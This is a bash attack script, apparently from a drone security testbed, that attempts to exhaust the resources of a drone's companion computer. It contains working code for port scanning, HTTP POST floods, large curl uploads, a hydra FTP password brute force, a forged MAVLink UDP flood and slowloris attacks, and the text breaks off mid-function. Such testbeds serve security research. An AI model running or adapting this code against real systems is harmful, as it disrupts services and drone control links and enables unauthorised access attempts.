#!/bin/bash

# =============================================================================
# DVD DoS Attack Module: Companion Computer Resource Exhaustion
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/companion_resource.sh
# 목적: 컴패니언 컴퓨터의 CPU, 메모리, 디스크 자원 고갈을 통한 서비스 거부
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="Companion Computer Resource Exhaustion"
ATTACK_TYPE="DENIAL_OF_SERVICE"
TARGET_IPS=("192.168.13.10" "192.168.13.50" "10.13.0.5")
ATTACK_DURATION=120
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/denial_of_service/companion_resource_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/companion_resource_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/denial_of_service/companion_resource_report_$(date +%Y%m%d_%H%M%S).json"

# 공격 PID 추적
declare -a ATTACK_PIDS=()

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                  🖥️  DVD Companion Resource Exhaustion 🖥️                ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: Companion Computer Resources${NC}"
    echo -e "${BLUE}Method: CPU/Memory/Disk Exhaustion${NC}"
    echo -e "${BLUE}Impact: System Performance Degradation${NC}"
    echo ""
}

# 타겟 시스템 정보 수집
gather_target_info() {
    local target_ip=$1
    
    echo -e "${CYAN}[*] Gathering information about ${target_ip}...${NC}" | tee -a "$LOG_FILE"
    
    # 포트 스캔으로 활성 서비스 확인
    local open_ports=()
    for port in 22 80 443 8080 5760 14550 14551; do
        if timeout 3s nc -z "$target_ip" "$port" 2>/dev/null; then
            open_ports+=("$port")
            echo -e "${GREEN}[+] Port ${port} is open${NC}" | tee -a "$LOG_FILE"
            echo "RECON:OPEN_PORT_${target_ip}:${port}" >> "$IOC_FILE"
        fi
    done
    
    # SSH 접근 가능성 확인
    if [[ " ${open_ports[@]} " =~ " 22 " ]]; then
        echo -e "${YELLOW}[*] SSH service detected on ${target_ip}${NC}" | tee -a "$LOG_FILE"
        echo "RECON:SSH_SERVICE_${target_ip}" >> "$IOC_FILE"
    fi
    
    # HTTP 서비스 확인
    for port in 80 8080; do
        if [[ " ${open_ports[@]} " =~ " ${port} " ]]; then
            echo -e "${YELLOW}[*] HTTP service detected on ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
            echo "RECON:HTTP_SERVICE_${target_ip}:${port}" >> "$IOC_FILE"
        fi
    done
    
    return 0
}

# CPU 고갈 공격
execute_cpu_exhaustion() {
    local target_ip=$1
    local duration=$2
    
    echo -e "${YELLOW}[+] Starting CPU exhaustion attack on ${target_ip}${NC}" | tee -a "$LOG_FILE"
    
    # Python을 사용한 원격 CPU 부하 생성
    python3 -c "
import threading
import time
import socket
import random
import hashlib

def cpu_intensive_task():
    end_time = time.time() + ${duration}
    while time.time() < end_time:
        # CPU 집약적 작업 수행
        for i in range(10000):
            hash_obj = hashlib.sha256(str(random.random()).encode())
            hash_obj.hexdigest()

def network_stress(target_ip):
    end_time = time.time() + ${duration}
    while time.time() < end_time:
        try:
            # 다중 소켓 연결로 네트워크 자원 소모
            sockets = []
            for _ in range(50):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex(('${target_ip}', 80))
                    sockets.append(sock)
                except:
                    pass
            
            time.sleep(0.1)
            
            # 소켓 정리
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
        except:
            continue

# 멀티스레드로 CPU 부하 생성
threads = []
for _ in range(4):  # 4개 스레드로 CPU 코어 모두 활용
    t = threading.Thread(target=cpu_intensive_task)
    threads.append(t)
    t.start()

# 네트워크 스트레스 추가
net_thread = threading.Thread(target=network_stress, args=('${target_ip}',))
threads.append(net_thread)
net_thread.start()

# 모든 스레드 완료 대기
for t in threads:
    t.join()

print('CPU exhaustion attack completed')
" 2>&1 | tee -a "$LOG_FILE" &
    
    local cpu_pid=$!
    ATTACK_PIDS+=("$cpu_pid")
    
    echo "DOS_ATTACK:CPU_EXHAUSTION_${target_ip}" >> "$IOC_FILE"
    return 0
}

# 메모리 고갈 공격
execute_memory_exhaustion() {
    local target_ip=$1
    local duration=$2
    
    echo -e "${YELLOW}[+] Starting memory exhaustion via network flooding${NC}" | tee -a "$LOG_FILE"
    
    # 대용량 HTTP 요청으로 메모리 소모 유도
    python3 -c "
import requests
import threading
import time
import random
import string

def memory_flood_http(target_ip, duration):
    end_time = time.time() + duration
    session = requests.Session()
    
    while time.time() < end_time:
        try:
            # 대용량 POST 데이터 생성
            large_data = ''.join(random.choices(string.ascii_letters + string.digits, k=100000))
            
            # 여러 HTTP 엔드포인트에 요청
            endpoints = ['/', '/upload', '/api/data', '/stream', '/video']
            
            for endpoint in endpoints:
                try:
                    url = f'http://{target_ip}:8080{endpoint}'
                    response = session.post(url, data={'data': large_data}, timeout=2)
                except:
                    try:
                        url = f'http://{target_ip}{endpoint}'
                        response = session.post(url, data={'data': large_data}, timeout=2)
                    except:
                        pass
                
                time.sleep(0.01)
        except:
            continue

# 다중 스레드로 메모리 부하 생성
threads = []
for _ in range(8):
    t = threading.Thread(target=memory_flood_http, args=('${target_ip}', ${duration}))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print('Memory exhaustion attack completed')
" 2>&1 | tee -a "$LOG_FILE" &
    
    local mem_pid=$!
    ATTACK_PIDS+=("$mem_pid")
    
    echo "DOS_ATTACK:MEMORY_EXHAUSTION_${target_ip}" >> "$IOC_FILE"
    return 0
}

# 디스크 I/O 고갈 공격
execute_disk_exhaustion() {
    local target_ip=$1
    local duration=$2
    
    echo -e "${YELLOW}[+] Starting disk I/O exhaustion via file operations${NC}" | tee -a "$LOG_FILE"
    
    # 네트워크를 통한 디스크 I/O 부하 생성
    if command -v curl &> /dev/null; then
        # 대용량 파일 업로드 시뮬레이션
        for i in {1..5}; do
            {
                dd if=/dev/zero bs=1M count=100 2>/dev/null | \
                curl -X POST -H "Content-Type: application/octet-stream" \
                     --data-binary @- "http://${target_ip}:8080/upload" \
                     --connect-timeout 5 --max-time 30 2>/dev/null
            } &
            
            ATTACK_PIDS+=("$!")
        done
    fi
    
    # FTP 브루트포스로 로그 파일 생성 유도
    if command -v hydra &> /dev/null; then
        {
            hydra -l admin -P /usr/share/wordlists/rockyou.txt \
                  -t 4 -V ftp://"$target_ip" 2>/dev/null
        } &
        ATTACK_PIDS+=("$!")
    fi
    
    echo "DOS_ATTACK:DISK_EXHAUSTION_${target_ip}" >> "$IOC_FILE"
    return 0
}

# 서비스별 특화 공격
execute_service_specific_attacks() {
    local target_ip=$1
    
    echo -e "${CYAN}[*] Executing service-specific attacks on ${target_ip}${NC}" | tee -a "$LOG_FILE"
    
    # MAVLink 서비스 타겟팅
    for port in 14550 14551 5760; do
        if timeout 2s nc -z "$target_ip" "$port" 2>/dev/null; then
            echo -e "${YELLOW}[+] Targeting MAVLink service on port ${port}${NC}" | tee -a "$LOG_FILE"
            
            # MAVLink 메시지 폭주
            python3 -c "
import socket
import struct
import time
import threading
import random

def mavlink_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + 30
    
    while time.time() < end_time:
        try:
            # 가짜 MAVLink 메시지 생성
            msg = struct.pack('<BBBBBBIH', 0xFD, 9, 0, 0, 1, 1, 1, 0)
            msg += struct.pack('<IBBBB', random.randint(0, 0xFFFFFFFF), 2, 3, 4, 5)
            sock.sendto(msg, (ip, port))
            time.sleep(0.001)  # 1000 pps
        except:
            continue
    
    sock.close()

mavlink_flood('${target_ip}', ${port})
" &
            ATTACK_PIDS+=("$!")
            
            echo "DOS_ATTACK:MAVLINK_FLOOD_${target_ip}:${port}" >> "$IOC_FILE"
        fi
    done
    
    # HTTP 서비스 타겟팅
    for port in 80 8080; do
        if timeout 2s nc -z "$target_ip" "$port" 2>/dev/null; then
            echo -e "${YELLOW}[+] Targeting HTTP service on port ${port}${NC}" | tee -a "$LOG_FILE"
            
            # HTTP 슬로우로리스 공격
            if command -v slowhttptest &> /dev/null; then
                slowhttptest -c 200 -H -g -o /tmp/slowloris_${target_ip}_${port} \
                            -i 10 -r 50 -t GET -u "http://${target_ip}:${port}/" \
                            -x 30 -p 3 2>&1 | tee -a "$LOG_FILE" &
                ATTACK_PIDS+=("$!")
                
                echo "DOS_ATTACK:SLOWLORIS_${target_ip}:${port}" >> "$IOC_FILE"
            fi
        fi
    done
}

# 시스템 자원 모니터링
monitor_attack_impact() {
    echo -e "${CYAN}[*] Monitoring attack impact on local resources...${NC}" | tee -a "$LOG_FILE"
    
    # 로컬 시스템 영향 모니터링
    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    local memory_usage=$(free | grep Mem | awk '{printf("%.1f"), $3/$2 * 100.0}')
    local load_avg=$(uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | tr -d ',')
    
    echo -e "${GREEN}[✓] Local System Impact:${NC}" | tee -a "$LOG_FILE"
    echo "    CPU Usage: ${cpu_usage}%" | tee -a "$LOG_FILE"
    echo "    Memory Usage: ${memory_usage}%" | tee -a "$LOG_FILE"
    echo "    Load Average: ${load_avg}" | tee -a "$LOG_FILE"
    
    # 네트워크 연결 수 체크
    local connections=$(netstat -an | grep -E '(ESTABLISHED|SYN_SENT|SYN_RECV)' | wc -l)
    echo "    Active Connections: ${connections}" | tee -a "$LOG_FILE"
    
    # IOCs 업데이트
    echo "DOS_IMPACT:LOCAL_CPU_${cpu_usage}%" >> "$IOC_FILE"
    echo "DOS_IMPACT:LOCAL_MEMORY_${memory_usage}%" >> "$IOC_FILE"
    echo "DOS_IMPACT:ACTIVE_CONNECTIONS_${connections}" >> "$IOC_FILE"
    
    # 네트워크 트래픽 모니터링
    local rx_bytes=$(cat /proc/net/dev | grep -E 'eth0|wlan0' | head -1 | awk '{print $2}')
    local tx_bytes=$(cat /proc/net/dev | grep -E 'eth0|wlan0' | head -1 | awk '{print $10}')
    
    echo "    Network RX: ${rx_bytes} bytes" | tee -a "$LOG_FILE"
    echo "    Network TX: ${tx_bytes} bytes" | tee -a "$LOG_FILE"
    
    echo "DOS_IMPACT:NETWORK_RX_${rx_bytes}" >> "$IOC_FILE"
    echo "DOS_IMPACT:NETWORK_TX_${tx_bytes}" >> "$IOC_FILE"
}

# 원격 시스템 상태 확인
check_remote_system_status() {
    local target_ip=$1
    
    echo -e "${CYAN}[*] Checking remote system status: ${target_ip}${NC}" | tee -a "$LOG_FILE"
    
    #